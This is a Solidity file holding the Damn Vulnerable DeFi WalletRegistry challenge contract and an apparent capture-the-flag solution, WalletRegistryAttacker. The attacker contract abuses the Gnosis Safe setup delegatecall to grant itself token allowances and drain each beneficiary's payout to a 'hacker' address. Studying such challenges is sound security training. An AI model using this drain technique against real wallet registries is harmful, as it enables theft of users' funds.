// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping (address => bool) public beneficiaries;

    // owner => wallet
    mapping (address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");
        
        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");

        // Ensure wallet initialization is the expected
        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");       

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);        
    }
}


interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker {

    address public masterCopyAddress;
    address public walletRegistryAddress;
    ProxyFactory proxyFactory;

    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) {
        proxyFactory = ProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
    }

    // we cant delegatecall directly into the ERC20 token's approve function because the state changes would
    // apply for the proxy (set allowance, which is not present on proxy) so instead we used a hop like:
    // this.createProxyWithCallback call -> proxy delegatecall -> this.approve (msg.sender = proxy) -> erc20.approve
    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(address tokenAddress, address hacker, address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            // add the current user as the owner of the proxy
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            // encoded payload to approve tokens for this contract
            bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddress);

            // GnossisSafe::setup function that will be called on the newly created proxy
            // pass in the approve function to to delegateCalled by the proxy into this contract
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
            GnosisSafeProxy proxy =
            proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));
            // transfer the approved tokens
            IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
        }
    }
}
